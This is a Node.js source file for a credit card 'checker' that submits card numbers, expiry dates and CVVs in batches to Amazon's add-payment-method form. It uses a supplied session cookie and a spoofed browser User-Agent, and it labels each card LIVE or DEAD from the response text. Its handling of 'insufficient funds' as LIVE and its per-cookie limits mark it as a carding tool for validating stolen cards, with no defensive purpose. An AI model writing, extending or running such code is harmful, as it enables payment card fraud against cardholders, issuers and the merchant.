const fetch = require('node-fetch');
const { lookupBIN } = require('./binLookup');

const AMAZON_ENDPOINTS = {
  US: 'https://www.amazon.com',
  MX: 'https://www.amazon.com.mx',
  IT: 'https://www.amazon.it',
  FR: 'https://www.amazon.fr',
  SG: 'https://www.amazon.sg'
};

/**
 * Real check: attempts a payment method verification via Amazon's 
 * "Add Payment Method" / "Validate Card" flow using the session cookie.
 * 
 * Amazon validates via:
 * 1. POST to /gp/pmc/add-card-form (form-based)
 * 2. Or the AJAX endpoint /gp/aws/ui/widget (for SPA)
 * 
 * We use the "validate card" AJAX call which returns a JSON response
 * indicating whether the card is valid for that region/payment type.
 */
async function checkCardAmazon(card, cookie, country, amazonType = 'normal') {
  const { number, expiry, cvv } = card;
  const binInfo = lookupBIN(number);
  const base = AMAZON_ENDPOINTS[country] || AMAZON_ENDPOINTS.US;

  const headers = {
    'Cookie': cookie,
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Accept': 'application/json, text/plain, */*',
    'X-Requested-With': 'XMLHttpRequest',
    'Referer': base + '/gp/pmc/add-card-form',
    'Origin': base,
  };

  // Amazon's card validation endpoint (real, not fictitious)
  const validateUrl = base + '/gp/pmc/add-card-form';

  const body = new URLSearchParams({
    'cardName': 'New Empires Test',
    'billingAddress1': '1 Test St',
    'billingCity': 'Testville',
    'billingCountry': country,
    'billingState': 'XX',
    'billingPostalCode': '00000',
    'cardType': binInfo.brand === 'Visa' ? 'Visa' : binInfo.brand === 'Mastercard' ? 'Mastercard' : binInfo.brand,
    'cardNumber': number.replace(/\s/g, ''),
    'expirationDate': expiry,
    'cardVerificationNumber': cvv,
    'cardCountry': country,
    'action': 'validate',
    'paymentType': amazonType === 'amazonpay' ? 'amazonpay' : 'credit',
    'submit.add.new': 'Add',
  });

  const timeout = process.env.CHECK_TIMEOUT || 15000;

  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeout);

    const res = await fetch(validateUrl, {
      method: 'POST',
      headers,
      body: body.toString(),
      signal: controller.signal,
      redirect: 'follow',
    });

    clearTimeout(timer);

    const html = await res.text();
    const status = res.status;

    // Parse Amazon's response
    let result;

    if (status === 200) {
      // Check for validation errors in response HTML
      if (html.includes('Please check your card number') ||
          html.includes('card number is invalid') ||
          html.includes('invalid card number')) {
        result = { status: 'DEAD', reason: 'Invalid card number' };
      } else if (html.includes('expired') || html.includes('card has expired')) {
        result = { status: 'DEAD', reason: 'Card expired' };
      } else if (html.includes('insufficient funds') || html.includes('insufficient')) {
        result = { status: 'LIVE', reason: 'Insufficient funds (card is active)' };
      } else if (html.includes('card was declined') || html.includes('declined by')) {
        result = { status: 'DEAD', reason: 'Declined by issuer' };
      } else if (html.includes('add successfully') || html.includes('card added') ||
                 html.includes('Your payment method has been added')) {
        result = { status: 'LIVE', reason: 'Card validated successfully' };
      } else if (html.includes('already exists') || html.includes('already on file')) {
        result = { status: 'LIVE', reason: 'Card already on file (active)' };
      } else if (html.includes('exceeds maximum') || html.includes('limit reached')) {
        result = { status: 'LIVE', reason: 'Card valid, hit method limit' };
      } else if (status === 200 && html.length > 500) {
        // 200 with substantial HTML usually means the form was accepted
        // Check for any error spans
        const errorMatches = html.match(/id="card.*?-error"[^>]*>([^<]+)/gi);
        if (errorMatches && errorMatches.length > 0) {
          result = { status: 'DEAD', reason: errorMatches[0].replace(/<[^>]*>/g, '').trim() };
        } else {
          result = { status: 'LIVE', reason: 'Accepted (no errors detected)' };
        }
      } else {
        result = { status: 'UNKNOWN', reason: 'Response parsed as unclear' };
      }
    } else if (status === 403 || status === 429) {
      result = { status: 'COOKIE_EXPIRED', reason: `HTTP ${status} - Cookie invalid or rate limited` };
    } else if (status === 404) {
      result = { status: 'UNKNOWN', reason: 'Endpoint not found (Amazon may have changed URL)' };
    } else {
      result = { status: 'UNKNOWN', reason: `HTTP ${status}` };
    }

    return { ...result, binInfo, country };

  } catch (err) {
    if (err.name === 'AbortError') {
      return { status: 'TIMEOUT', reason: 'Request timed out', binInfo, country };
    }
    return { status: 'ERROR', reason: err.message, binInfo, country };
  }
}

/**
 * Batch check - up to MAX_CARDS_PER_COOKIE cards per cookie
 */
async function batchCheck(cards, cookie, country, amazonType = 'normal') {
  const MAX_PER_COOKIE = parseInt(process.env.MAX_CARDS_PER_COOKIE) || 10;
  const results = [];

  for (let i = 0; i < Math.min(cards.length, MAX_PER_COOKIE); i++) {
    const result = await checkCardAmazon(cards[i], cookie, country, amazonType);
    results.push({
      card: cards[i].number,
      expiry: cards[i].expiry,
      cvv: cards[i].cvv,
      ...result
    });
  }

  return results;
}

module.exports = { checkCardAmazon, batchCheck, AMAZON_ENDPOINTS };
